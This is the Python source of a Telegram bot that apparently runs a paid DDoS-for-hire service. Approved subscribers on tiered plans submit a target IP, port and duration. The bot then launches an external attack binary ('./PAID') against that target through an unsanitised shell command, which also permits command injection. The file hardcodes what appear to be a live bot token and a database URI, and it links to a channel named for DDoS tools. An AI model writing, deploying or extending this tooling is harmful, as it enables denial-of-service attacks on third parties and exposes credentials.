
import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread
import subprocess

# Initialize event loop properly
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

TOKEN = '8373103943:AAGcCj4y9JmmQvZGwoektVshuYuehdXQ9X4'
MONGO_URI = 'mongodb://atlas-sql-695a0db568d14341efe3d88a-ct7hvs.a.query.mongodb.net/sample_mflix?ssl=true&authSource=admin'
FORWARD_CHANNEL_ID = -8417161342   

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['anxx']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

running_processes = []
    
error_channel_id = CHANNEL_ID = FORWARD_CHANNEL_ID
REMOTE_HOST = '4.213.71.157'  

async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./PAID {target_ip} {target_port} {duration} 600"
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        running_processes.append(process)
        stdout, stderr = await process.communicate()
        output = stdout.decode()
        error = stderr.decode()

        if output:
            logging.info(f"Command output: {output}")
        if error:
            logging.error(f"Command error: {error}")

    except Exception as e:
        logging.error(f"Failed to execute command on Codespace: {e}")
    finally:
        if process in running_processes:
            running_processes.remove(process)

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    await run_attack_command_on_codespace(target_ip, target_port, duration)

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

def check_user_approval(user_id):
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data and user_data.get('plan', 0) > 0:  # Fixed: using .get() with default
        # Check if plan is still valid
        valid_until = user_data.get('valid_until', '')
        if valid_until:
            try:
                if datetime.now().date() > datetime.fromisoformat(valid_until).date():
                    return False
            except:
                pass
        return True
    return False

def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    
    if action == '/approve':
        if len(cmd_parts) < 4:
            bot.send_message(chat_id, "*For approve, use: /approve <user_id> <plan> <days>*", parse_mode='Markdown')
            return
            
        plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
        days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

        if plan == 1:  # Instant Plan 🧡
            if users_collection.count_documents({"plan": 1}) >= 99:
                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
                return
        elif plan == 2:  # Instant++ Plan 💥
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "*Approval failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')

@bot.message_handler(commands=['Attack', 'attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    try:
        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid command format. Please use: target_ip target_port duration*", parse_mode='Markdown')
            return
        
        target_ip, target_port_str, duration_str = args[0], args[1], args[2]
        
        # Validate inputs
        try:
            target_port = int(target_port_str)
        except ValueError:
            bot.send_message(message.chat.id, "*Port must be a number*", parse_mode='Markdown')
            return
            
        try:
            duration = int(duration_str)
        except ValueError:
            bot.send_message(message.chat.id, "*Duration must be a number*", parse_mode='Markdown')
            return

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        # Run attack asynchronously
        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration} seconds*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")
        bot.send_message(message.chat.id, "*Error processing attack command. Please try again.*", parse_mode='Markdown')

def handle_stop(message):
    try:
        subprocess.run("pkill -f 3day", shell=True, check=False)
        time.sleep(2)
        bot.reply_to(message, "*🛑 Attack stopped...*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error stopping attack: {e}")
        bot.reply_to(message, "*Error stopping attack.*", parse_mode='Markdown')

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    # Create a markup object
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=False)  # Changed one_time_keyboard to False

    # Create buttons
    btn1 = KeyboardButton("Stop Attack 🧡")
    btn2 = KeyboardButton("Start Attack 💥")
    btn3 = KeyboardButton("Canary Download✔️")
    btn4 = KeyboardButton("My Account🏦")
    btn5 = KeyboardButton("Help❓")
    btn6 = KeyboardButton("Contact admin✔️")

    # Add buttons to the markup (arranged in rows)
    markup.row(btn1, btn2)
    markup.row(btn3, btn4)
    markup.row(btn5, btn6)

    welcome_text = """
*Welcome to the Bot!*

Available commands:
- /start - Show this menu
- /help - Get help
- /Attack - Start an attack

Use the buttons below to navigate:
    """
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode='Markdown')

# Handler for button presses (text messages)
@bot.message_handler(func=lambda message: True, content_types=['text'])
def handle_message(message):
    # Check if user is approved (except for /start and /help)
    if message.text not in ['/start', '/help'] and not check_user_approval(message.from_user.id):
        send_not_approved_message(message.chat.id)
        return

    if message.text == "Stop Attack 🧡":
        handle_stop(message)
    elif message.text == "Start Attack 💥":
        bot.reply_to(message, "*Initiating Attack...*", parse_mode='Markdown')
        attack_command(message)
    elif message.text == "Canary Download✔️":
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/LSR_DDOS/4995*", parse_mode='Markdown')
    elif message.text == "My Account🏦":
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data:
            username = message.from_user.username or "No username"
            plan = user_data.get('plan', 'N/A')
            valid_until = user_data.get('valid_until', 'N/A')
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Translate plan numbers to names
            plan_names = {
                0: "Free",
                1: "Instant Plan 🧡",
                2: "Instant++ Plan 💥"
            }
            plan_display = plan_names.get(plan, f"Plan {plan}")
            
            response = (f"*ACCOUNT INFORMATION*\n\n"
                        f"*Username:* {username}\n"
                        f"*User ID:* {user_id}\n"
                        f"*Plan:* {plan_display}\n"
                        f"*Valid Until:* {valid_until}\n"
                        f"*Current Time:* {current_time}*")
        else:
            response = "*No account information found. Please contact the administrator.*"
        bot.reply_to(message, response, parse_mode='Markdown')
    elif message.text == "Help❓":
        bot.reply_to(message, "*Heya Master_-_\n\n Join @OSCHEATS on Telegram*", parse_mode='Markdown')
    elif message.text == "Contact admin✔️":
        bot.reply_to(message, "*My Admins Are*\n\n @LSR_RAJPUT", parse_mode='Markdown')
    elif message.text.startswith('/'):
        # Let command handlers handle commands
        pass
    else:
        bot.reply_to(message, "*No such buttons found to process...\n\nType /start to refresh the menu*", parse_mode='Markdown')

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

if __name__ == "__main__":
    # Start asyncio thread
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    
    logging.info("BOT IS BEING STARTED GO TO TELEGRAM AND CHECK....")
    
    # Start bot polling
    while True:
        try:
            bot.infinity_polling(timeout=30, long_polling_timeout=10)  # Using infinity_polling for better stability
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
            logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before restarting...")
            time.sleep(REQUEST_INTERVAL)
